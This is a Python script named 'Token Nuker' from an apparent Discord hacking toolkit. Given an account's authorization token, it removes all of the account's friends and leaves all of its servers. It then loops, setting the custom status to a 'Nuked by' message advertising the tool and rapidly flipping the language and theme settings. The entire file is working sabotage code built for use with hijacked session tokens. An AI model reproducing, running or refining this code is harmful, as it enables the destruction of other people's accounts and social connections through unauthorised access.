# Copyright (c) 2025-2026 v4lkyr0 — Buildware-Tools
# See the file 'LICENSE' for copying permission.
# --------------------------------------------------------
# EN: Non-commercial use only. Do not sell, remove credits
#     or redistribute without prior written permission.
# FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
#     les crédits ou redistribuer sans autorisation écrite.

from Plugins.Utils import *
from Plugins.Config import *

try:
    from itertools import cycle
    import random
    import requests
    import time
except Exception as e:
    MissingModule(e)

Title("Token Nuker")
Connection()

Scroll(GradientBanner(discord_banner))

try:
    token      = ChoiceToken()
    new_status = input(f"{INPUT} Custom Status {red}->{reset} ").strip()

    try:
        loop_count = int(input(f"{INPUT} Loops {red}->{reset} ").strip())
    except:
        ErrorNumber()

    headers        = {"Authorization": token, "Content-Type": "application/json", "User-Agent": RandomUserAgents()}
    default_status = f"Nuked by {name_tool} | {github_url}"
    custom_status  = f"{new_status} | {name_tool}"
    themes_cycle   = cycle(["dark", "light"])

    def RemoveFriends():
        friends = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
        for friend in friends:
            if friend.get("type") != 1:
                continue
            friend_id = friend["id"]
            response  = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend_id}", headers=headers)
            if response.status_code == 204:
                print(f"{SUCCESS} Status:{red} Deleted {white}| Friend:{red} {friend_id}", reset)
            else:
                print(f"{ERROR} Status:{red} Failed  {white}| Friend:{red} {friend_id}", reset)

    def LeaveServers():
        guilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
        for guild in guilds:
            guild_id = guild["id"]
            response = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers)
            if response.status_code == 204:
                print(f"{SUCCESS} Status:{red} Left    {white}| Server:{red} {guild_id}", reset)
            else:
                print(f"{ERROR} Status:{red} Failed  {white}| Server:{red} {guild_id}", reset)

    print(f"{LOADING} Removing friends..", reset)
    RemoveFriends()

    print(f"{LOADING} Leaving servers..", reset)
    LeaveServers()

    print(f"{LOADING} Nuking..", reset)

    for _ in range(loop_count):
        for status_text in [default_status, custom_status]:
            response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"custom_status": {"text": status_text}})
            if response.status_code == 200:
                print(f"{SUCCESS} Status:{red} Changed {white}| Custom Status:{red} {status_text}", reset)
            else:
                print(f"{ERROR} Status:{red} Failed  {white}| Custom Status:{red} {status_text}", reset)

            for _ in range(5):
                random_language = random.choice(["zh", "ar", "ja", "ko", "ru"])
                response        = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"locale": random_language})
                if response.status_code == 200:
                    print(f"{SUCCESS} Status:{red} Changed {white}| Language:{red} {random_language}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Language:{red} {random_language}", reset)

                theme    = next(themes_cycle)
                response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"theme": theme})
                if response.status_code == 200:
                    print(f"{SUCCESS} Status:{red} Changed {white}| Theme:{red} {theme}", reset)
                else:
                    print(f"{ERROR} Status:{red} Failed  {white}| Theme:{red} {theme}", reset)

                time.sleep(0.33)

    Continue()
    Reset()

except Exception as e:
    Error(e)